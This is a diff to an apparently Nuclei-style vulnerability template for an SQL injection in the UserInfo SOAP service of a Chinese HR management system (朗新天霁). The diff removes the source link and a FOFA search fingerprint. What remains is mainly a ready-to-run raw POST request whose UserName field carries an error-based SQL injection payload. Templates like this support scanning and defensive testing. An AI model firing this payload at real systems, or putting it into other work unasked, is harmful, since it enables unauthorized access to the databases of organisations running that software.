@@ -3,12 +3,8 @@ info:
   name: 朗新天霁人力资源管理系统 UserInfo 存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/sb6dzmn3ytgdlhct'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: sb6dzmn3ytgdlhct
-    fofa: body="divRememberPwd"
 http:
 - raw:
   - "POST /ws/ZFMCWs/ZFMCWebService.asmx HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/xml; charset=utf-8\nContent-Length: length\nSOAPAction: \"http://tempuri.org/UserInfo\"\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soap:Body>\n    <UserInfo xmlns=\"http://tempuri.org/\">\n      <UserName>') AND 1004 IN (SELECT (CHAR(113)+CHAR(120)+CHAR(118)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (1004=1004) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(120)+CHAR(118)+CHAR(106)+CHAR(113)))-- OOxB</UserName>\n      <DeptName>rt</DeptName>\n    </UserInfo>\n  </soap:Body>\n</soap:Envelope>"
